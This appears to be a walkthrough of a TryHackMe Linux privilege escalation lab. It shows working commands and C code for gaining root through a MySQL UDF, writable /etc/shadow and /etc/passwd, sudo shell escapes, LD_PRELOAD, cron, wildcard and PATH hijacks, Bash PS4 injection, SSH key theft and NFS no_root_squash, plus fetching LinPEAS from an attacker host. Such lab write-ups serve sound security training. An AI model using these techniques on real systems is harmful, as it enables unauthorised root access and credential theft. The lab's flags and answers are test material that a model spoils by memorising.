---
name: "Linux PrivEsc"
platform: THM
category: "Linux"
difficulty: "Medium"
os: "Linux"
points: 150
ip: "10.10.x.x"
date: "2026-04-24"
tools: ["LinPEAS", "SUID", "Cron", "Sudo", "NFS"]
userFlag: "THM{user_privesc_flag}"
rootFlag: "THM{root_privesc_flag}"
description: "A comprehensive guide to Linux privilege escalation. Learn to exploit SUID binaries, cron jobs, sudo misconfigurations, weak file permissions, and insecure NFS mounts to escalate from user to root."
---

# SYSTEM BREACH: Linux Local Privilege Escalation

This room provides a comprehensive guide to escalating privileges on a Linux system, covering a wide array of misconfigurations.

## 1. Initial Access & Enumeration

**The Goal:** Connect to the machine and run automated enumeration scripts to identify potential vectors.

### Task 1: Deploy the Vulnerable Machine
Connect to the machine using SSH with the provided low-privileged user credentials:
```bash
ssh user@10.10.x.x
```

```plaintext
user@10.10.x.x's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-116-generic x86_64)

user@debian:~$
```

### Task 20: Privilege Escalation Scripts
While manual enumeration is critical to learn, in the real world, scripts like **LinPEAS**, **LinEnum**, and **Linux Exploit Suggester** automate the discovery of vulnerabilities. Run them and save the output:
```bash
wget http://<YOUR_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

```plaintext
                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

[+] SUID - Check easy privesc, exploits and write perms
[red/yellow] /usr/local/bin/suid-env
[red/yellow] /usr/local/bin/suid-so
[red/yellow] /usr/bin/exim-4.84-3
```

## 2. Service Exploits

**The Goal:** Exploit internal services running as root.

### Task 2: Service Exploits
The MySQL service is running as root. We can use the MySQL User Defined Function (UDF) exploit to execute commands.
Log into MySQL using the empty root password:
```bash
mysql -u root
```
Execute the UDF exploit to run a command as root:
```sql
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

```plaintext
+---------------------------------------------------------+
| sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash') |
+---------------------------------------------------------+
|                                                       0 |
+---------------------------------------------------------+
1 row in set (0.01 sec)
```
Exit MySQL and run the SUID bash shell:
```bash
/tmp/rootbash -p
```

```plaintext
rootbash-4.4# whoami
root
rootbash-4.4#
```

## 3. Weak File Permissions

**The Goal:** Abuse misconfigured permissions on critical system files (`/etc/shadow`, `/etc/passwd`).

### Task 3: Readable /etc/shadow
If the `/etc/shadow` file is readable, we can extract password hashes and crack them offline.
```bash
cat /etc/shadow
```

```plaintext
root:$6$Tb/euwmK$OXA.FAcjODH...:18396:0:99999:7:::
daemon:*:18375:0:99999:7:::
user:$6$qj0x...:18396:0:99999:7:::
```
Copy the root hash and crack it with John The Ripper:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Task 4: Writable /etc/shadow
If we can write to `/etc/shadow`, we can generate a new password hash and replace the root's current hash.
Generate a SHA-512 hash:
```bash
mkpasswd -m sha-512 newpassword
```

```plaintext
$6$q.hK9A1A$y7pZt/v0g8T8R4D...
```
Edit `/etc/shadow` and replace the root hash with the new one, then `su root`.

### Task 5: Writable /etc/passwd
If `/etc/passwd` is writable, we can generate a new user with root privileges (UID 0) or change the root password directly.
Generate a hash:
```bash
openssl passwd newpassword
```

```plaintext
OazC9p0X.
```
Add a new root user to `/etc/passwd`:
```bash
echo "newroot:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
su newroot
```

## 4. Sudo Exploitation

**The Goal:** Abuse `sudo` rights granted to the user.

### Task 6: Shell Escape Sequences
Check allowed sudo commands:
```bash
sudo -l
```

```plaintext
Matching Defaults entries for user on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
```
If programs like `vim`, `awk`, `less`, or `nmap` are allowed, we can escape to a shell. Reference [GTFOBins](https://gtfobins.github.io/) for specific escapes.
```bash
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
```

### Task 7: Environment Variables
If `sudo -l` shows `env_keep+=LD_PRELOAD`, we can load a malicious shared object when running a permitted sudo command.
Create `shell.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```
Compile and execute:
```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2
```

## 5. Cron Job Abuse

**The Goal:** Exploit scheduled tasks running as root.

### Task 8: File Permissions
If a cron job runs a script that we have write access to, we can modify the script to spawn a reverse shell or give us a SUID binary.
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /usr/local/bin/overwrite.sh
```

### Task 9: PATH Environment Variable
If the crontab defines a custom `PATH` (e.g., `PATH=/home/user:/usr/bin`), we can place a malicious executable in our home directory with the same name as the cron command.
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

### Task 10: Wildcards
If a cron job uses a wildcard like `tar *`, we can create files with special names that `tar` interprets as command-line arguments (e.g., `--checkpoint=1`).
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

## 6. SUID & SGID Vectors

**The Goal:** Exploit binaries that run with the owner's privileges (usually root).

### Task 11: Known Exploits
Search for SUID binaries:
```bash
find / -type f -perm -4000 2>/dev/null
```

```plaintext
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/exim-4.84-3
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
```
If a known vulnerable binary like `exim-4.84-3` is present, search `searchsploit` for a local root exploit.

### Task 12: Shared Object Injection
Trace the SUID binary with `strace` to find missing shared libraries:
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

```plaintext
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
open("/home/user/.config/libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```
If it looks for `libcalc.so` in our home directory, compile a malicious `.so` file and place it there.

### Task 13: Environment Variables
If an SUID binary executes another program (like `service`) without a full path, we can hijack the PATH variable.
```bash
gcc -o service service.c
export PATH=.:$PATH
/usr/local/bin/suid-env
```

### Task 14: Abusing Shell Features (#1)
In Bash < 4.2, we can define a function with the same name as an absolute path used by an SUID binary.
```bash
function /usr/sbin/service() { cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

### Task 15: Abusing Shell Features (#2)
In Bash < 4.4, when in debugging mode, Bash uses the `PS4` environment variable. We can execute commands via `PS4`.
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

## 7. Passwords & SSH Keys

**The Goal:** Find sensitive information left behind by administrators.

### Task 16: History Files
Check `.bash_history` for accidentally typed passwords or cleartext commands.
```bash
cat ~/.bash_history
```

```plaintext
ls -al
cd /tmp
mysql -u root -p'supersecretpassword123'
rm -rf /var/log/apache2/access.log
exit
```

### Task 17: Config Files
Search for configuration files that might contain database credentials or internal passwords (e.g., OpenVPN configs).

### Task 18: SSH Keys
Check for readable `.ssh/id_rsa` files, especially in root's directory or backup locations.
```bash
cat /root/.ssh/id_rsa
```

```plaintext
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA0P3z...
...
-----END RSA PRIVATE KEY-----
```

## 8. NFS Misconfigurations

**The Goal:** Exploit `no_root_squash` on exported shares.

### Task 19: NFS
Check exported shares:
```bash
cat /etc/exports
```

```plaintext
/home/user/share *(rw,sync,insecure,all_squash)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
If a share has `no_root_squash`, we can mount it on our Kali machine, create a SUID binary as root, and then execute it on the target system.
```bash
# On Kali:
sudo mount -o rw 10.10.x.x:/tmp /mnt
gcc -o /mnt/rootbash shell.c
chmod +s /mnt/rootbash

# On Target:
/tmp/rootbash -p
```

<FlagReveal type="root" flag="THM{root_privesc_flag}" />
